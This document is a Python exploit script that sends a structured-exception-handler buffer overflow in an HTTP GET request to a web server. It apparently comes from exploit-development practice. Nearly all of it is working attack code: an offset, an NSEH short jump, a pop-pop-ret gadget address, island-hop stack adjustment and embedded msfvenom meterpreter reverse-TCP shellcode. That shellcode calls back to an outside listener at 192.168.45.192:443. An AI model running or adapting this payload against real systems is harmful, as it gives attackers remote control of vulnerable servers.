#!/usr/bin/python
import socket, sys
from struct import pack

host = sys.argv[1]
port = 80

# 02afff54 - location of first exception?  set bp

def send_exploit_request():
	
    size = 6000

# 10000000 10221000 libspp               /SafeSEH OFF    
#	Found 101576c0 (58 5b c3 - pop eax, pop ebx, ret)

# Found address 01eadab8 to reliably test for badchars  
# BADCHARS:
# \x00
# \x09
# \x0a
# \x0d
# \x20

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.192 LPORT=443 -b "\x00\x09\x0a\x0d\x20" -f python -v shellcode

    shellcode = b"\x90" * 20 	# leading NOPS
    shellcode +=  b""
    shellcode += b"\xdb\xdf\xbd\xe1\x8b\x1b\xa1\xd9\x74\x24\xf4"
    shellcode += b"\x5b\x31\xc9\xb1\x59\x83\xc3\x04\x31\x6b\x15"
    shellcode += b"\x03\x6b\x15\x03\x7e\xe7\x49\x4c\x81\x18\x8a"
    shellcode += b"\x32\x0b\xfd\xbb\x60\x6f\x75\xe9\xb4\xfb\xdb"
    shellcode += b"\x02\x3f\xa9\xcf\x2b\xc0\xc5\x82\x63\x31\x6d"
    shellcode += b"\x28\x52\x7c\x51\x01\xa6\x1f\x2d\x58\xfb\xff"
    shellcode += b"\x0c\x93\x0e\xfe\x49\x65\x64\xef\x04\xfd\xd4"
    shellcode += b"\xff\x23\x43\xe5\xfe\xe3\xcf\x55\x78\x53\x55"
    shellcode += b"\x95\x0c\x17\x54\xc6\x67\xef\x4e\xb6\xfc\xa8"
    shellcode += b"\x4e\x37\xd1\xcc\x46\x43\xe9\xff\xa7\xe5\x9a"
    shellcode += b"\x34\xd3\xf7\x4a\x05\x23\x36\xbd\x6b\x0f\xb8"
    shellcode += b"\x86\x4c\xaf\xce\xfc\xae\x52\xc9\xc7\xcd\x88"
    shellcode += b"\x5c\xd7\x76\x5a\xc6\x33\x86\x8f\x91\xb0\x84"
    shellcode += b"\x64\xd5\x9e\x88\x7b\x3a\x95\xb5\xf0\xbd\x79"
    shellcode += b"\x3c\x42\x9a\x5d\x64\x10\x83\xc4\xc0\xf7\xbc"
    shellcode += b"\x16\xac\xa8\x18\x5d\x5f\xbe\x1d\x9e\x9f\xbf"
    shellcode += b"\x43\x08\x53\x72\x7c\xc8\xfb\x05\x0f\xfa\xa4"
    shellcode += b"\xbd\x87\xb6\x2d\x18\x5f\xcf\x3a\x9b\x8f\x77"
    shellcode += b"\x2a\x65\x30\x87\x62\xa2\x64\xd7\x1c\x03\x05"
    shellcode += b"\xbc\xdc\xac\xd0\x28\xd7\x3a\x1b\x04\xca\x7a"
    shellcode += b"\xf3\x56\x15\x7a\xbf\xdf\xf3\x2c\xef\x8f\xab"
    shellcode += b"\x8c\x5f\x6f\x1c\x65\x8a\x60\x43\x95\xb5\xab"
    shellcode += b"\xec\x3c\x5a\x05\x44\xa9\xc3\x0c\x1e\x48\x0b"
    shellcode += b"\x9b\x5a\x4a\x87\x29\x9a\x05\x60\x58\x88\x72"
    shellcode += b"\x17\xa2\x50\x83\xb2\xa2\x3a\x87\x14\xf5\xd2"
    shellcode += b"\x85\x41\x31\x7d\x75\xa4\x42\x7a\x89\x39\x72"
    shellcode += b"\xf0\xbc\xaf\x3a\x6e\xc1\x3f\xba\x6e\x97\x55"
    shellcode += b"\xba\x06\x4f\x0e\xe9\x33\x90\x9b\x9e\xef\x05"
    shellcode += b"\x24\xf6\x5c\x8d\x4c\xf4\xbb\xf9\xd2\x07\xee"
    shellcode += b"\x79\x14\xf7\x6c\x56\xbd\x9f\x8e\xe6\x3d\x5f"
    shellcode += b"\xe5\xe6\x6d\x37\xf2\xc9\x82\xf7\xfb\xc3\xca"
    shellcode += b"\x9f\x76\x82\xb9\x3e\x86\x8f\x1c\x9e\x87\x3c"
    shellcode += b"\x85\x11\xfd\x4d\x3a\xd2\x02\x44\x5f\xd3\x02"
    shellcode += b"\x68\x61\xe8\xd4\x51\x17\x2f\xe5\xe5\x28\x1a"
    shellcode += b"\x48\x4f\xa3\x64\xde\x8f\xe6"
  
    buffer = b"\x41" * 2495		# Offset to NSEH is at 2495
    buffer += pack("<L", (0x06eb9090))	# NSEH: 4-byte short jump   
    buffer += pack("<L", (0x101576c0))	# SEH: 4-byte pop pop ret (offset is 2499) 			 			
    buffer += b"\x90" * 2
    buffer += b"\x66\x81\xC4\x64\x0F"	# ISLAND HOP: add sp, 0xf64
    buffer += b"\xff\xe4"		# ISLAND HOP:  JMP ESP
    buffer += shellcode    
    buffer += b"\x44" * (size - len(buffer) -len(shellcode)) # Shellcode starts at 0216c868

    #HTTP Request
    request = "GET /" + buffer + "HTTP/1.1" + "\r\n"
    request += "Host: " + host + "\r\n"
    request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + "\r\n"
    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
    request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
    request += "Accept-Encoding: gzip, deflate" + "\r\n"
    request += "Connection: keep-alive" + "\r\n\r\n"
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(request)
    s.close()

if __name__ == "__main__": 
    send_exploit_request()
